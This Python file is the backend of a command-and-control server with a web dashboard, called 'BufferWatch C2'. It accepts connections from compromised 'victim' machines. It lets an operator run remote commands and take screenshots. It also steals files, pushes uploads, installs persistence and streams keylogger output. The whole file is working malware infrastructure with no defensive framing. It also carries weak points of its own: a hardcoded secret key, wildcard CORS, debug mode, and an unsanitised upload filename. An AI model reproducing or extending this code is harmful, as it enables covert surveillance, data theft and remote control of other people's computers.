"""
BufferWatch C2 Dashboard – Flask + SocketIO backend
Fully fixed: sends status to new web clients automatically
"""

import os, threading, queue, base64, time
from datetime import datetime
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import socket
from colorama import init

init(autoreset=True)

# Config
LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 50005
BUFFER_SIZE = 4096
SCREENSHOT_DIR = "screenshots"
DOWNLOAD_DIR = "downloads"
UPLOAD_DIR = "uploads"
KEYLOG_DIR = "keylogs"
for d in [SCREENSHOT_DIR, DOWNLOAD_DIR, UPLOAD_DIR, KEYLOG_DIR]:
    os.makedirs(d, exist_ok=True)

# Socket helpers
def recv_line(sock, timeout=5):
    sock.settimeout(timeout)
    data = b''
    while True:
        try:
            ch = sock.recv(1)
            if not ch or ch == b'\n':
                break
            data += ch
        except socket.timeout:
            return None
    sock.settimeout(None)
    return data.decode(errors='ignore')

def recv_exact(sock, length, timeout=30):
    sock.settimeout(timeout)
    data = b''
    while len(data) < length:
        try:
            chunk = sock.recv(min(BUFFER_SIZE, length - len(data)))
            if not chunk:
                return None
            data += chunk
        except socket.timeout:
            return None
    sock.settimeout(None)
    return data

def drain_until_empty_line(sock):
    while True:
        line = recv_line(sock, timeout=1)
        if line is None or line == "":
            break

# --------------------------- Victim Handler ---------------------------
class VictimHandler(threading.Thread):
    def __init__(self, sock, addr):
        super().__init__(daemon=True)
        self.sock = sock
        self.target_id = f"{addr[0]}:{addr[1]}"
        self.queue = queue.Queue()
        self.stop_event = threading.Event()

    def run(self):
        global current_status, current_banner
        print(f"[*] Victim connected: {self.target_id}")
        current_status = {'connected': True, 'target': self.target_id}
        # Broadcast immediately to all web clients
        socketio.emit('status', current_status)

        banner = recv_line(self.sock)
        if banner and banner.strip():
            current_banner = banner.strip()
            socketio.emit('response', {'text': current_banner})
        else:
            current_banner = None

        while not self.stop_event.is_set():
            try:
                cmd = self.queue.get(timeout=0.5)
                if cmd is None:
                    break
                self._handle_command(cmd)
                self.queue.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                socketio.emit('response', {'text': f'Error: {e}'})
                break

        self.sock.close()
        current_status = {'connected': False, 'target': None}
        current_banner = None
        socketio.emit('status', current_status)
        print(f"[*] Victim {self.target_id} disconnected.")

    # Command routing
    def _handle_command(self, cmd):
        if cmd == 'screenshot':
            self._cmd_screenshot()
        elif cmd.startswith('download '):
            self._cmd_download(cmd[9:].strip())
        elif cmd.startswith('upload '):
            self._cmd_upload(cmd[7:].strip())
        elif cmd == 'keylog_start':
            self._cmd_keylogger()
        elif cmd == 'persist':
            self.sock.sendall(b'persist\n')
            resp = recv_line(self.sock)
            if resp:
                socketio.emit('response', {'text': resp})
            drain_until_empty_line(self.sock)
        else:
            self._cmd_generic(cmd)

    def _cmd_screenshot(self):
        self.sock.sendall(b'screenshot\n')
        size_line = recv_line(self.sock)
        if not size_line:
            socketio.emit('response', {'text': 'Error: no size for screenshot'})
            return
        try:
            file_size = int(size_line.strip())
        except ValueError:
            socketio.emit('response', {'text': f'Invalid size: {size_line}'})
            return
        bmp_data = recv_exact(self.sock, file_size)
        if not bmp_data:
            socketio.emit('response', {'text': 'Error: incomplete screenshot'})
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{self.target_id}_{ts}.bmp"
        with open(os.path.join(SCREENSHOT_DIR, filename), "wb") as f:
            f.write(bmp_data)
        b64 = base64.b64encode(bmp_data).decode('utf-8')
        socketio.emit('screenshot', {'filename': filename, 'data': b64})
        drain_until_empty_line(self.sock)

    def _cmd_download(self, filename):
        drain_until_empty_line(self.sock)
        self.sock.sendall(f"download {filename}\n".encode())
        size_line = recv_line(self.sock)
        if not size_line:
            socketio.emit('response', {'text': 'Download: no size received'})
            return
        try:
            file_size = int(size_line.strip())
        except ValueError:
            socketio.emit('response', {'text': f'Download: invalid size {size_line}'})
            return
        if file_size == 0:
            socketio.emit('response', {'text': 'File not found or empty'})
            return
        file_data = recv_exact(self.sock, file_size)
        if not file_data:
            socketio.emit('response', {'text': 'Download: incomplete data'})
            return
        safe_name = filename.replace(':', '_').replace('\\', '_').replace('/', '_')
        save_path = os.path.join(DOWNLOAD_DIR, safe_name)
        with open(save_path, "wb") as f:
            f.write(file_data)
        b64 = base64.b64encode(file_data).decode('utf-8')
        socketio.emit('download', {'filename': safe_name, 'data': b64})
        drain_until_empty_line(self.sock)

    def _cmd_upload(self, local_filename):
        full_path = os.path.join(UPLOAD_DIR, local_filename)
        if not os.path.isfile(full_path):
            socketio.emit('response', {'text': f'Upload: local file "{local_filename}" not found'})
            return
        self.sock.sendall(b'upload dummy\n')
        file_size = os.path.getsize(full_path)
        self.sock.sendall(f"{file_size}\n".encode())
        time.sleep(0.2)
        with open(full_path, "rb") as f:
            while True:
                chunk = f.read(BUFFER_SIZE)
                if not chunk: break
                self.sock.sendall(chunk)
                time.sleep(0.01)
        resp = recv_line(self.sock)
        if resp:
            socketio.emit('response', {'text': resp})
        drain_until_empty_line(self.sock)

    def _cmd_keylogger(self):
        self.sock.sendall(b'keylog_start\n')
        started = recv_line(self.sock)
        if started:
            socketio.emit('response', {'text': started})
        drain_until_empty_line(self.sock)

        def receive_keys():
            log_file = os.path.join(KEYLOG_DIR, f"keylog_{self.target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
            with open(log_file, "wb") as kf:
                self.sock.settimeout(1.0)
                try:
                    while True:
                        data = self.sock.recv(BUFFER_SIZE)
                        if not data: break
                        socketio.emit('keylog_data', {'data': data.decode(errors='ignore')})
                        kf.write(data)
                        kf.flush()
                except socket.timeout:
                    pass
                finally:
                    self.sock.settimeout(None)
            socketio.emit('response', {'text': f'Keylogger stopped. Saved to {log_file}'})
        threading.Thread(target=receive_keys, daemon=True).start()

    def _cmd_generic(self, cmd):
        self.sock.sendall(cmd.encode() + b'\n')
        output_lines = []
        while True:
            line = recv_line(self.sock, timeout=2)
            if line is None or line == "":
                break
            output_lines.append(line)
        if output_lines:
            socketio.emit('response', {'text': '\n'.join(output_lines)})


# --------------------------- Global state ---------------------------
victims = {}
current_target = None
current_status = {'connected': False, 'target': None}
current_banner = None

def c2_listener():
    global current_target
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    print(f"[*] C2 listener running on port {LISTEN_PORT}")
    while True:
        try:
            client, addr = server.accept()
            handler = VictimHandler(client, addr)
            handler.start()
            victims[handler.target_id] = handler
            if current_target is None:
                current_target = handler.target_id
        except Exception as e:
            print(f"[-] Accept error: {e}")


# --------------------------- Flask App ---------------------------
app = Flask(__name__)
app.config['SECRET_KEY'] = 'change-me'
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins="*")

@app.route('/')
def index():
    return render_template('index.html')

# When a new web client connects, immediately send the current status
@socketio.on('connect')
def web_connect():
    emit('status', current_status)
    if current_banner:
        emit('response', {'text': current_banner})

# Also allow clients to request status manually
@socketio.on('get_status')
def send_status():
    emit('status', current_status)
    if current_banner:
        emit('response', {'text': current_banner})

@socketio.on('command')
def handle_command(data):
    global current_target
    cmd = data.get('cmd', '').strip()
    if not cmd:
        return
    if current_target is None or current_target not in victims:
        emit('response', {'text': 'No victim connected.'})
        return
    victims[current_target].queue.put(cmd)

@app.route('/upload_file', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file', 400
    f = request.files['file']
    if f.filename == '':
        return 'No filename', 400
    f.save(os.path.join(UPLOAD_DIR, f.filename))
    return 'OK', 200

# Start C2 listener immediately
threading.Thread(target=c2_listener, daemon=True).start()


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)